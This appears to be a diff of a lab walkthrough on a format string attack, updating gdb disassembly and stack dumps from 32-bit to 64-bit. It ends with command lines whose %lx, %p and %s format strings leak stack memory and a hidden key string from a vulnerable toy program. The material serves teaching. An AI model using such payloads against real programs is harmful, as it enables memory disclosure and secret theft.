@@ -24,100 +24,133 @@ Format String Attack
 
 $ gdb ./fmt_string
 
-(gdb) break 16
-Breakpoint 1 at 0x8048457: file fmt_string.c, line 16.
+(gdb) break main
+Breakpoint 1 at 0x40050d: file fmt_string.c, line 14.
+
+(gdb) disass main
+Dump of assembler code for function main:
+   0x00000000004004fe <+0>:     push   rbp
+   0x00000000004004ff <+1>:     mov    rbp,rsp
+   0x0000000000400502 <+4>:     sub    rsp,0x20
+   0x0000000000400506 <+8>:     mov    DWORD PTR [rbp-0x14],edi
+   0x0000000000400509 <+11>:    mov    QWORD PTR [rbp-0x20],rsi
+   0x000000000040050d <+15>:    mov    QWORD PTR [rbp-0x8],0x4005c0
+   0x0000000000400515 <+23>:    mov    rax,QWORD PTR [rbp-0x20]
+   0x0000000000400519 <+27>:    add    rax,0x8
+   0x000000000040051d <+31>:    mov    rax,QWORD PTR [rax]
+   0x0000000000400520 <+34>:    mov    rdi,rax
+   0x0000000000400523 <+37>:    call   0x4004d7 <print>
+   0x0000000000400528 <+42>:    mov    eax,0x0
+   0x000000000040052d <+47>:    leave
+   0x000000000040052e <+48>:    ret
 
 (gdb) disass print
 Dump of assembler code for function print:
-   0x08048430 <+0>:     push   ebp
-   0x08048431 <+1>:     mov    ebp,esp
-   0x08048433 <+3>:     sub    esp,0x8
-   0x08048436 <+6>:     mov    DWORD PTR [ebp-0x4],0xaabbccdd
-   0x0804843d <+13>:    mov    eax,DWORD PTR [ebp+0x8]
-   0x08048440 <+16>:    mov    DWORD PTR [esp],eax
-   0x08048443 <+19>:    call   0x80482f0 <printf@plt>
-   0x08048448 <+24>:    leave  
-   0x08048449 <+25>:    ret    
+   0x00000000004004d7 <+0>:     push   rbp
+   0x00000000004004d8 <+1>:     mov    rbp,rsp
+   0x00000000004004db <+4>:     sub    rsp,0x20
+   0x00000000004004df <+8>:     mov    QWORD PTR [rbp-0x18],rdi
+   0x00000000004004e3 <+12>:    mov    DWORD PTR [rbp-0x4],0xaabbccdd
+   0x00000000004004ea <+19>:    mov    rax,QWORD PTR [rbp-0x18]
+   0x00000000004004ee <+23>:    mov    rdi,rax
+   0x00000000004004f1 <+26>:    mov    eax,0x0
+>  0x00000000004004f6 <+31>:    call   0x4003f0 <printf@plt>
+   0x00000000004004fb <+36>:    nop
+   0x00000000004004fc <+37>:    leave
+   0x00000000004004fd <+38>:    ret
 
-(gdb) break *0x08048443
-Breakpoint 2 at 0x8048443: file fmt_string.c, line 8.
+(gdb) break *0x00000000004004f6
+Breakpoint 2 at 0x4004f6: file fmt_string.c, line 8.
 
 (gdb) run hello
 Breakpoint 1, main (argc=2, argv=0xbfffefb4) at fmt_string.c:16
 
 (gdb) disass 
 Dump of assembler code for function main:
-   0x0804844a <+0>: push   ebp
-   0x0804844b <+1>: mov    ebp,esp
-   0x0804844d <+3>: sub    esp,0x8
-   0x08048450 <+6>: mov    DWORD PTR [ebp-0x4],0x8048504
-=> 0x08048457 <+13>:    mov    eax,DWORD PTR [ebp+0xc]
-   0x0804845a <+16>:    add    eax,0x4
-   0x0804845d <+19>:    mov    eax,DWORD PTR [eax]
-   0x0804845f <+21>:    mov    DWORD PTR [esp],eax
-   0x08048462 <+24>:    call   0x8048430 <print>
-   0x08048467 <+29>:    mov    eax,0x0
-   0x0804846c <+34>:    leave  
-   0x0804846d <+35>:    ret  
-
-(gdb) x/8xw $esp
-0xbfffef10: 0x08048470  0x08048504  0x00000000  0x46cbe963
-0xbfffef20: 0x00000002  0xbfffefb4  0xbfffefc0  0xb7ffe6b0
+   0x00000000004004fe <+0>:     push   rbp
+   0x00000000004004ff <+1>:     mov    rbp,rsp
+   0x0000000000400502 <+4>:     sub    rsp,0x20
+   0x0000000000400506 <+8>:     mov    DWORD PTR [rbp-0x14],edi
+   0x0000000000400509 <+11>:    mov    QWORD PTR [rbp-0x20],rsi
+   0x000000000040050d <+15>:    mov    QWORD PTR [rbp-0x8],0x4005c0
+=> 0x0000000000400515 <+23>:    mov    rax,QWORD PTR [rbp-0x20]
+   0x0000000000400519 <+27>:    add    rax,0x8
+   0x000000000040051d <+31>:    mov    rax,QWORD PTR [rax]
+   0x0000000000400520 <+34>:    mov    rdi,rax
+   0x0000000000400523 <+37>:    call   0x4004d7 <print>
+>  0x0000000000400528 <+42>:    mov    eax,0x0
+   0x000000000040052d <+47>:    leave
+   0x000000000040052e <+48>:    ret
 
 (gdb) c
-Breakpoint 2, 0x08048443 in print (s_ptr=0xbffff1a0 "hello") at fmt_string.c:8
+Breakpoint 2, 0x00000000004004f6 in print (s_ptr=0x7fffffffdeae "hello") at fmt_string.c:8
 
 (gdb) disass
 Dump of assembler code for function print:
-   0x08048430 <+0>: push   ebp
-   0x08048431 <+1>: mov    ebp,esp
-   0x08048433 <+3>: sub    esp,0x8
-   0x08048436 <+6>: mov    DWORD PTR [ebp-0x4],0xaabbccdd
-   0x0804843d <+13>:    mov    eax,DWORD PTR [ebp+0x8]
-   0x08048440 <+16>:    mov    DWORD PTR [esp],eax
-=> 0x08048443 <+19>:    call   0x80482f0 <printf@plt>
-   0x08048448 <+24>:    leave  
-   0x08048449 <+25>:    ret    
+   0x00000000004004d7 <+0>:     push   rbp
+   0x00000000004004d8 <+1>:     mov    rbp,rsp
+   0x00000000004004db <+4>:     sub    rsp,0x20
+   0x00000000004004df <+8>:     mov    QWORD PTR [rbp-0x18],rdi
+   0x00000000004004e3 <+12>:    mov    DWORD PTR [rbp-0x4],0xaabbccdd
+   0x00000000004004ea <+19>:    mov    rax,QWORD PTR [rbp-0x18]
+   0x00000000004004ee <+23>:    mov    rdi,rax
+   0x00000000004004f1 <+26>:    mov    eax,0x0
+=> 0x00000000004004f6 <+31>:    call   0x4003f0 <printf@plt>
+   0x00000000004004fb <+36>:    nop
+   0x00000000004004fc <+37>:    leave
+   0x00000000004004fd <+38>:    ret
 
-(gdb) x/32xw $esp
-0xbfffef00: 0xbffff1a0  0xaabbccdd  0xbfffef18  0x08048467
-0xbfffef10: 0xbffff1a0  0x08048504  0x00000000  0x46cbe963
-0xbfffef20: 0x00000002  0xbfffefb4  0xbfffefc0  0xb7ffe6b0
-0xbfffef30: 0x00000001  0x00000001  0x00000000  0x0804a014
-0xbfffef40: 0x0804821c  0x46e5e000  0x00000000  0x00000000
-0xbfffef50: 0x00000000  0x5c31cbda  0x343dce28  0x00000000
-0xbfffef60: 0x00000000  0x00000000  0x00000002  0x08048320
-0xbfffef70: 0x00000000  0x46c96f10  0x46cbe879  0x46ca1fd4
+gdb) info register
+rbp            0x7fffffffd9e0   0x7fffffffd9e0
+rsp            0x7fffffffd9c0   0x7fffffffd9c0
+rip            0x4004f6 0x4004f6 <print+31>
+
+(gdb) x/16xg $rsp
+0x7fffffffd9c0: 0x0000000000000001      0x00007fffffffdeae
+0x7fffffffd9d0: 0x0000000000000001      0xaabbccdd0040057d
+0x7fffffffd9e0: 0x00007fffffffda10      0x0000000000400528
+0x7fffffffd9f0: 0x00007fffffffdaf8      0x0000000200400400
 
 (gdb) stepi
-0x080482f0 in printf@plt ()
+0x00000000004003f0 in printf@plt ()
 
 (gdb) disass
 Dump of assembler code for function printf@plt:
-=> 0x080482f0 <+0>: jmp    DWORD PTR ds:0x804a00c
-   0x080482f6 <+6>: push   0x0
-   0x080482fb <+11>:    jmp    0x80482e0
+=> 0x00000000004003f0 <+0>:     jmp    QWORD PTR [rip+0x200c22]        # 0x601018
+   0x00000000004003f6 <+6>:     push   0x0
+   0x00000000004003fb <+11>:    jmp    0x4003e0
 
-(gdb) x/32xw $esp
-0xbfffeefc: 0x08048448  0xbffff1a0  0xaabbccdd  0xbfffef18
-0xbfffef0c: 0x08048467  0xbffff1a0  0x08048504  0x00000000
-0xbfffef1c: 0x46cbe963  0x00000002  0xbfffefb4  0xbfffefc0
-0xbfffef2c: 0xb7ffe6b0  0x00000001  0x00000001  0x00000000
-0xbfffef3c: 0x0804a014  0x0804821c  0x46e5e000  0x00000000
-0xbfffef4c: 0x00000000  0x00000000  0x5c31cbda  0x343dce28
-0xbfffef5c: 0x00000000  0x00000000  0x00000000  0x00000002
-0xbfffef6c: 0x08048320  0x00000000  0x46c96f10  0x46cbe879
+(gdb) info register
+rdi            0x7fffffffdeb8   140737488346808
+rbp            0x7fffffffd9e0   0x7fffffffd9e0
+rsp            0x7fffffffd9b8   0x7fffffffd9b8
+rip            0x4003f0 0x4003f0 <printf@plt>
 
-(gdb) x/1s 0xbffff1a0
-0xbffff1a0: "hello"
+(gdb) x/16xg $rsp
+0x7fffffffd9b8: 0x00000000004004fb      0x0000000000000001
+0x7fffffffd9c8: 0x00007fffffffdeb8      0x0000000000000001
+0x7fffffffd9d8: 0xaabbccdd0040057d      0x00007fffffffda10
+0x7fffffffd9e8: 0x0000000000400528      0x00007fffffffdaf8
+0x7fffffffd9f8: 0x0000000200400400      0x00007fffffffdaf0
+0x7fffffffda08: 0x00000000004005c0      0x0000000000400530
+0x7fffffffda18: 0x00007f920628450a      0x0000000000000002
+0x7fffffffda28: 0x00007fffffffdaf8      0x0000000200040000
+
+(gdb) x/1s 0x7fffffffdeb8
+0x7fffffffdeb8: "hello"
+
+(gdb) x/1s 0x00000000004005c0
+0x4005c0:       "X8GX-6S5V-MOI0-PL5F"
 
 
 2. Format String Attack
 ----------------------------------------------------------------
 
-$ ./fmt_string "hello %08x"
-hello aabbccdd
+$ ./fmt_string "hello %lx"
+hello 7fffffffdbd8
 
-$ ./fmt_string "hello %08x %08x %08x %s %s"
-hello aabbccdd bfffef58 08048467 hello %08x %08x %08x %s %s X8GX-6S5V-MOI0-PL5F 
+$ ./fmt_string "hello %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %s"
+hello 7fffffffdba8 7fffffffdbc0 0 4005a0 7fecb0f1a2d0 1 7fffffffdeef 1 aabbccdd0040057d 7fffffffdac0 400528 7fffffffdba8 200400400 7fffffffdba0 X8GX-6S5V-MOI0-PL5F
 
+$ ./fmt_string "hello %p %p %p %p %p %p %p %p %p %p %p %p %p %p %s"
+hello 0x7fffffffdbb8 0x7fffffffdbd0 (nil) 0x4005a0 0x7f861f2ca2d0 0x1 0x7fffffffdeff 0x1 0xaabbccdd0040057d 0x7fffffffdad0 0x400528 0x7fffffffdbb8 0x200400400 0x7fffffffdbb0 X8GX-6S5V-MOI0-PL5F[
